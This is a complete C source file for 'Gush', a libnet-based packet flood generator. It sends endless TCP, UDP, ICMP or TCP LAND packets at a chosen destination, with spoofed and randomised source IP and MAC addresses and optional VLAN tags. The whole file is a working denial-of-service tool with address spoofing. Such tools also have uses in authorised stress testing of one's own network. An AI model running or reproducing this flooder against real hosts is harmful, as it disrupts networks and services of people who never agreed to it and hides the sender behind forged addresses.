/* gush.c - Version 1.0.3  06 Feb 16
   Gush - Packet Flood Generator
   Copyright 2010-2016 Del Castle

   Requires libnet1-dev

   Linux Compile: gcc -O2 -o gush gush.c -lnet

   Usage: gush -i <interface> -d <destination> [-s <source>] [-p <port>] [-t <type>] [-f <flags>] [-m <mac> [-v <vlan>]] [-c <count>] [-r]
            -i <interface> - Flood out interface (eth0, eth1, wlan0, etc.).
            -d <destination> - Destination IP address.
            -s <source> - Source IP address (default destination net).
            -p <port> - Destination TCP/UDP port (default 139).
            -t <type> - t (TCP), l (TCP LAND), u (UDP), i (ICMP) (default TCP).
            -f <flags> - TCP flags - u (URG), a (ACK), p (PSH), r (RST), s (SYN), f (FIN).
            -m <mac> - Destination MAC address (random source MAC address for each packet)
            -v <vlan> - VLAN identifier (0 - 4094)
            -c <count> - Packets to send (default infinite)
            -r - Random last 2 octets of source IP address for each packet (default last octet only)
*/

#include <libnet.h>

int goRun = -1;

void stopRun(int sig)
{
  if (sig) goRun = 0;
}

void showUsage(char *command)
{
  fprintf(stderr, "Gush 1.0.3 usage: %s -i <interface> -d <destination> [-s <source>] [-p <port>] [-t <type>] [-f <flags>] [-m <mac> [-v <vlan>]] [-c <count>] [-r]\n"
    "  -i <interface> : flood out interface (eth0, eth1, wlan0, etc.)\n"
    "  -d <destination> : destination ip address\n"
    "  -s <source> : source ip address (default destination net)\n"
    "  -p <port> : destination tcp/udp port (default 139)\n"
    "  -t <type> : t (tcp), l (tcp land), u (udp), i (icmp) (default tcp)\n"
    "  -f <flags> : tcp flags - u (urg), a (ack), p (psh), r (rst), s (syn), f (fin)\n"
    "  -m <mac> : destination mac address (random source mac address for each packet)\n"
    "  -v <vlan> : vlan identifier (0 - 4094)\n"
    "  -c <count> : packets to send (default infinite)\n"
    "  -r : random last 2 octets of source ip address for each packet (default last octet only)\n", command);
}

int main(int argc, char *argv[])
{
  int argOpt = 1, unused;
  char errorBuffer[LIBNET_ERRBUF_SIZE], strInterface[16] = "", strDstMAC[18] = "";
  while (++argOpt < argc)
  {
    if (!strcmp(argv[argOpt - 1], "-i"))
    {
      strncat(strInterface, argv[argOpt], 15);
      break;
    }
  }
  if (*strInterface == '\0')
  {
    fprintf(stderr, "gush error: no interface entered\n");
    showUsage(argv[0]);
    return 1;
  }
  unsigned char *pDstMAC = 0;
  libnet_t *pLnet = 0;
  argOpt = 1;
  while (++argOpt < argc)
  {
    if (!strcmp(argv[argOpt - 1], "-m"))
    {
      strncat(strDstMAC, argv[argOpt], 17);
      pLnet = libnet_init(LIBNET_LINK, strInterface, errorBuffer);  //write frames at layer 2
      if (!pLnet)
      {
        fprintf(stderr, "gush error: libnet_init() failed- %s, check interface- %s, layer 2\n", errorBuffer, strInterface);
        return 1;
      }
      pDstMAC = libnet_hex_aton(strDstMAC, &unused);
      break;
    }
  }
  if (*strDstMAC == '\0')
  {
    pLnet = libnet_init(LIBNET_RAW4, strInterface, errorBuffer);  //write packets at layer 3
    if (!pLnet)
    {
      fprintf(stderr, "gush error: libnet_init() failed- %s, check interface- %s, layer 3\n", errorBuffer, strInterface);
      return 1;
    }
  }
  unsigned char protocolIP = IPPROTO_TCP, flagsTCP = 0;
  unsigned short dstPort = 139, szData = LIBNET_TCP_H, vlanId = 4095;
  int goSource = 0, goRandom = 0;
  unsigned long srcIP = 0, dstIP = 0;
  char strDstIP[16] = "", strSrcIP[16] = "";
  while ((argOpt = getopt(argc, argv, "i:d:s:p:t:f:m:v:c:r")) != -1)
  {
    switch (argOpt)
    {
      case 'i': break;
      case 'd':
        strncat(strDstIP, optarg, 15);
        if ((dstIP = libnet_name2addr4(pLnet, strDstIP, LIBNET_RESOLVE)) == 0xffffffff)
        {
          fprintf(stderr, "gush error: invalid destination ip address- %s\n", strDstIP);
          free(pDstMAC);
          libnet_destroy(pLnet);
          return 1;
        }
        break;
      case 's':
        strncat(strSrcIP, optarg, 15);
        if ((srcIP = libnet_name2addr4(pLnet, strSrcIP, LIBNET_RESOLVE)) == 0xffffffff)
        {
          fprintf(stderr, "gush error: invalid source ip address- %s\n", strSrcIP);
          free(pDstMAC);
          libnet_destroy(pLnet);
          return 1;
        }
        goSource = 1;
        break;
      case 'p': dstPort = atoi(optarg); break;
      case 't':
        switch (*optarg)
        {
          case 'l':  //tcp land
            srcIP = dstIP;
            goSource = 1;
            break;
          case 'u':  //udp
            protocolIP = IPPROTO_UDP;
            szData = LIBNET_UDP_H;
            break;
          case 'i':  //icmp
            protocolIP = IPPROTO_ICMP;
            szData = LIBNET_ICMPV4_ECHO_H;
            break;
        }
        break;
      case 'f':  //tcp flags
        if (strchr(optarg, 'u')) flagsTCP = TH_URG;
        if (strchr(optarg, 'a')) flagsTCP = flagsTCP | TH_ACK;
        if (strchr(optarg, 'p')) flagsTCP = flagsTCP | TH_PUSH;
        if (strchr(optarg, 'r')) flagsTCP = flagsTCP | TH_RST;
        if (strchr(optarg, 's')) flagsTCP = flagsTCP | TH_SYN;
        if (strchr(optarg, 'f')) flagsTCP = flagsTCP | TH_FIN;
        break;
      case 'm': break;
      case 'v': if (pDstMAC) vlanId = atoi(optarg); break;
      case 'c': goRun = atoi(optarg); break;
      case 'r': goRandom = 1; break;
      default:
        showUsage(argv[0]);
        free(pDstMAC);
        libnet_destroy(pLnet);
        return 1;
    }
  }
  if (*strDstIP == '\0')
  {
    fprintf(stderr, "gush error: no destination ip address entered\n");
    showUsage(argv[0]);
    free(pDstMAC);
    libnet_destroy(pLnet);
    return 1;
  }
  if (!goSource) srcIP = (goRandom ? dstIP & 0xFFFF : dstIP & 0xFFFFFF);
  if (libnet_seed_prand(pLnet) == -1)  //seed random number generator
  {
    fprintf(stderr, "gush error: libnet_seed_prand() failed\n");
    free(pDstMAC);
    libnet_destroy(pLnet);
    return 1;
  }
  int cntError = 0, cntOctet;
  unsigned char *pSrcMAC = libnet_hex_aton("00:00:00:00:00:00", &unused);
  signal(SIGINT, stopRun);  //capture ctrl+c
  signal(SIGTERM, stopRun);  //capture kill
  while (goRun)
  {
    if (protocolIP == IPPROTO_TCP) libnet_build_tcp((goSource && (srcIP == dstIP) ? dstPort : libnet_get_prand(LIBNET_PRu16)),  //source port
                                               dstPort,  //dest port
                                               libnet_get_prand(LIBNET_PRu32),  //seq
                                               0,  //ack
                                               flagsTCP, //flags
                                               32767,  //window
                                               0,  //checksum
                                               0,  //urg
                                               LIBNET_TCP_H,  //len
                                               0,  //payload
                                               0,  //payload size
                                               pLnet,
                                               0);  //create tcp header
    else if (protocolIP == IPPROTO_UDP) libnet_build_udp(libnet_get_prand(LIBNET_PRu16),  //source port
                                                    dstPort,  //dest port
                                                    LIBNET_UDP_H,  //len
                                                    0,  //checksum
                                                    0,  //payload
                                                    0,  //payload size
                                                    pLnet,
                                                    0);  //create udp header
    else libnet_build_icmpv4_echo(ICMP_ECHO,  //type
                                  0,  //code
                                  0,  //checksum
                                  libnet_get_prand(LIBNET_PRu16),  //id
                                  libnet_get_prand(LIBNET_PRu16),  //seq
                                  0,  //payload
                                  0,  //payload size
                                  pLnet,
                                  0);  //create icmp header
    libnet_build_ipv4(LIBNET_IPV4_H + szData,  //total len
                      0,  //tos
                      libnet_get_prand(LIBNET_PRu16),  //id
                      0,  //frag
                      255,  //ttl
                      protocolIP,  //protocol
                      0,  //checksum
                      (goSource ? srcIP : (srcIP + htonl(libnet_get_prand(goRandom ? LIBNET_PRu16 : LIBNET_PR8)))),  //source ip address
                      dstIP,  //dest ip address
                      0,  //payload
                      0,  //payload size
                      pLnet,
                      0);  //create ipv4 header
    if (pDstMAC)
    {
      for (cntOctet = 0; cntOctet < 6; cntOctet++) *(pSrcMAC + cntOctet) = libnet_get_prand(LIBNET_PR8);  //random source mac address
      if (vlanId < 4095) libnet_build_802_1q(pDstMAC,  //dest mac address
                                              pSrcMAC,  //source mac address
                                              ETHERTYPE_VLAN,  //tpid
                                              7,  //priority
                                              0,  //cfi
                                              vlanId,  //vlan id
                                              ETHERTYPE_IP,  //type
                                              0,  //payload
                                              0,  //payload size
                                              pLnet,
                                              0);  //create 802.1q vlan header
      else libnet_build_ethernet(pDstMAC,  //dest mac address
                                 pSrcMAC,  //source mac address
                                 ETHERTYPE_IP,  //type
                                 0,  //payload
                                 0,  //payload size
                                 pLnet,
                                 0);  //create ethernet header
    }
    if (libnet_write(pLnet) != -1) cntError = 0;  //write frame/packet
    else if (++cntError == 10)  //10 write errors in succession
    {
      fprintf(stderr, "gush error: libnet_write() failed- %s\n", libnet_geterror(pLnet));
      free(pSrcMAC);
      free(pDstMAC);
      libnet_destroy(pLnet);
      return 1;
    } 
    libnet_clear_packet(pLnet);
    if (goRun > 0) goRun--;
  }
  free(pSrcMAC);
  free(pDstMAC);
  libnet_destroy(pLnet);
  return 0;
}
